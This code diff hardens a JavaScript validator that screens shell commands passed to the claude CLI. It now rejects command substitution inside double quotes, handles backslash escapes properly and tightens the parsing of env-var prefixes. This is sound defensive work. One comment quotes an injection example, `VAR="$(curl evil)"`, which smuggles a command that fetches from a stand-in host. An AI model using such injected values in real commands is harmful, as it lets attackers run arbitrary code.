@@ -41,10 +41,21 @@ const GitWatcher = require('./git-watcher');
  * shell's problem to quote correctly, not a bridge-boundary violation, and
  * flagging it here would reject legitimate prompts.
  */
-function hasUnquotedShellOperator(s) {
-  // Walk the string tracking single/double-quote state. A shell control operator
-  // that appears OUTSIDE quotes can chain/substitute a second command; inside
-  // quotes it's just prompt text. Unbalanced quotes are treated as unsafe.
+function hasDangerousShellOperator(s) {
+  // Walk the string tracking single/double-quote state.
+  //
+  // POSIX semantics that matter here:
+  //   - Single quotes suppress EVERYTHING, including $() and backticks.
+  //   - Double quotes suppress word-splitting and most metacharacters BUT still
+  //     evaluate command substitution ($(...)) and backticks. So those two must
+  //     be rejected even inside double quotes.
+  //   - Chaining/redirection operators (; | & > < newline) only act outside
+  //     quotes.
+  // Unbalanced quotes are treated as unsafe.
+  // Single quotes are literal (no escapes). Inside double quotes and in the
+  // unquoted context, a backslash escapes the next character, so we consume both
+  // explicitly (i++) rather than relying on a fragile s[i-1] lookback — that
+  // lookback desyncs on inputs like `\\"` (escaped backslash + real closing quote).
   let inSingle = false;
   let inDouble = false;
   for (let i = 0; i < s.length; i++) {
@@ -54,9 +65,14 @@ function hasUnquotedShellOperator(s) {
       continue;
     }
     if (inDouble) {
-      if (c === '"' && s[i - 1] !== '\\') inDouble = false;
+      if (c === '\\') { i++; continue; }          // escaped char — skip both
+      if (c === '"') { inDouble = false; continue; }
+      // Command substitution is still live inside double quotes:
+      if (c === '`') return true;
+      if (c === '$' && s[i + 1] === '(') return true;
       continue;
     }
+    if (c === '\\') { i++; continue; }             // unquoted escape — skip both
     if (c === "'") { inSingle = true; continue; }
     if (c === '"') { inDouble = true; continue; }
     // Unquoted context:
@@ -74,10 +90,12 @@ function isAllowedBridgeCommand(command) {
   const trimmed = command.trim();
   if (trimmed.length === 0) return false;
 
-  // Strip any leading env-var assignments (bare or quoted values), e.g.
+  // Strip any leading env-var assignments, e.g.
   // `CLAUDE_CODE_OAUTH_TOKEN="..." claude --print ...`.
+  // Allowed value forms: single-quoted, a safe bareword, OR double-quoted WITHOUT
+  // `$` or backtick (so a plain token passes but `VAR="$(curl evil)"` does not).
   const cleaned = trimmed.replace(
-    /^(?:[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|[^\s]*)\s+)+/,
+    /^(?:[A-Za-z_][A-Za-z0-9_]*=(?:'[^']*'|"[^"$`]*"|[A-Za-z0-9_./:@=+-]*)\s+)+/,
     ''
   );
 
@@ -86,9 +104,9 @@ function isAllowedBridgeCommand(command) {
   const execToken = cleaned.split(/\s+/)[0] || '';
   if (!(execToken === 'claude' || /(^|\/)claude$/.test(execToken))) return false;
 
-  // No unquoted shell operator anywhere — prompt metacharacters inside quotes
-  // are fine, chaining/substitution outside quotes is not.
-  if (hasUnquotedShellOperator(trimmed)) return false;
+  // No dangerous shell operator anywhere — chaining/redirection outside quotes,
+  // and command substitution ($()/backtick) even inside double quotes.
+  if (hasDangerousShellOperator(trimmed)) return false;
 
   return true;
 }
